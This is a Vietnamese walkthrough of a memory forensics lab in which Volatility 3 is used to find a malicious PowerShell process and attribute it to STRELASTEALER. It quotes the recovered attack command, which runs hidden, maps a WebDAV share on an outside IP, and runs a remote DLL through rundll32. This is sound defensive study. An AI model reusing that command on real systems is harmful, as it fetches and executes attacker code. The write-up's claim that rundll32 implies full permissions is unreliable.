# First to this challenge

- Ở trong bài này, họ yêu cầu ta sử dụng kiến thức về vola và memory forensics để tìm ra các đáp án.

# Head to challenge
## Q1

![image](https://github.com/user-attachments/assets/6a71cdbe-b66a-4f01-ad80-930c2ab1aec7)

### Analysis

Họ yêu cầu ta phải tìm ra malicious process và tên của nó, ở trong volatility 3 có 1 plugin tên là windows.pslist, nó dùng để list ra các process đang chạy. Lúc này ta sẽ dựa vào nó để tìm ra.

#### Walkthrough

``` 3692    4120    powershell.exe  0xc90c0358b080  17      -       1       False   2024-07-15 07:00:03.000000 UTC  N/A     Disabled ```

Ở đây, sau khi xem qua, mình thấy rằng có một chút vấn đề về process của powershell, 1 process về terminal và command đáng nhẽ sẽ phải có thời gian ngừng lại, vậy nhưng powershell thì không, nó luôn chạy ngầm trong máy và có đến 17 threads đang chạy, tức là nó đang dùng tài nguyên của máy.

Để tiếp tục hiểu rõ hơn, mình sử dụng tiếp plugin của vol3 là cmdline để list ra các powershell commandline mà process đang chạy

``` 3692    powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry ```

Lúc này, mình có thể confirm 100% đây là malicious activity. Vì mình có thể thấy rằng, attacker đang sử dụng powershell để map một IP nào đó và chạy dll32 để bypass lớp bảo vệ và tải về dll sus là 3435.dll và còn đang chạy hidden để cho không ai phát hiện.

-> Đáp án: powershell.exe

## Q2

![image](https://github.com/user-attachments/assets/54b94c98-794e-4b7b-af5a-ef5a3d9711f2)

### Walkthrough

Vì mình đã tìm được process của malicious process trước, nên mình đã biết được rằng PPID của powershell.exe là 4120

## Q3

![image](https://github.com/user-attachments/assets/b613611d-d695-4757-871f-377b2ed159bc)

### Analysis

Tiếp tục với câu 1, ở câu này, mình phải đi tìm file name được sử dụng bởi malware thực thi payload tiếp theo sau khi đã tấn công qua câu lệnh powershell ở trên câu 1

#### Walkthrough

``` 3692    powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry ```

Giống như câu 1, mình tìm ra rằng attacker đang dùng rundll32 để chạy 3435.dll, một dynamic linked library đã được map bằng một IP lạ và 8888 cũng không phải là port default, nên ta có thể xác định đây là 1 IP sú.

## Q4

![image](https://github.com/user-attachments/assets/dc16bbab-57a2-4b68-ac82-ab84e9d438f3)

### Walkthrough

Tiếp tục với powershell script ở các câu trước, mình có thể chỉ ra rằng shared directory là davwwwroot

## Q5

![image](https://github.com/user-attachments/assets/aae22828-8e88-43ad-a649-1db6bc9bae79)

### Walkthrough

Sau khi google một khoảng thời gian, mình tìm ra được sub-technique ở đây là System Binary Proxy Execution: Rundll32, MITRE ID là T1218.011

Để hiểu hơn thì, Attacker có thể trigger rundll32.exe, đây là 1 chương trình giúp thực thi các file dll trên windows và sẽ có thể bypass các trình duyệt virus vì đây là 1 default process của windows và để sử dụng nó thì tức là bạn đã có full permissions của windows. Nên điều này có thể trigger các trình duyệt virus để bypass nó.

Để trigger Rundll32.exe, ta có ví dụ là **rundll32.exe {DLLname, DLLfunction}**

## Q6

![image](https://github.com/user-attachments/assets/78bf5696-72cb-4c04-946c-f2c2617f94c9)

### Walkthrough

Ở đây, ta phải tìm username. Trong vol3 có 1 plugin giúp ta tìm ra các thông tin cơ bản của các process như username, các directory đi kèm và root folder của process đó.

Từ câu 1, ta biết rằng malicious process là powershell, vì vậy nên giờ ta chỉ cần dùng cmdline như sau:

``` python3 volatility3/vol.py -f 192-Reveal.dmp windows.envars | grep powershell.exe ```

Và ta sẽ tìm được ``` 3692    powershell.exe  0x1cb6aa61f90   USERNAME        Elon  ```

Vậy, username ở đây là Elon

## Q7

![image](https://github.com/user-attachments/assets/6fd3777b-57a9-43a4-b0cf-7fbc1262d240)

### Walkthrough

Vẫn tiếp tục là powershell script từ câu 1, như mình đã đề cập tới, có 1 IP lạ đã xuất hiện và đóng vai trò như là 1 website để cho rundll32 có thể map đến đó và run 3435.dll

Sử dụng virustotal để kiểm tra thử

![image](https://github.com/user-attachments/assets/2e61354f-eb37-47ef-9140-eedc8cc46175)

Activity related to STRELASTEALER. Vậy, ta biết được rằng malware family ở đây thuộc về STRELASTEALER.

STRELASTEALER là một họ malware được sử dụng để đánh cắp dữ liệu email từ các trình gửi email nổi tiếng và sẽ gửi nó về C2 server của attacker.
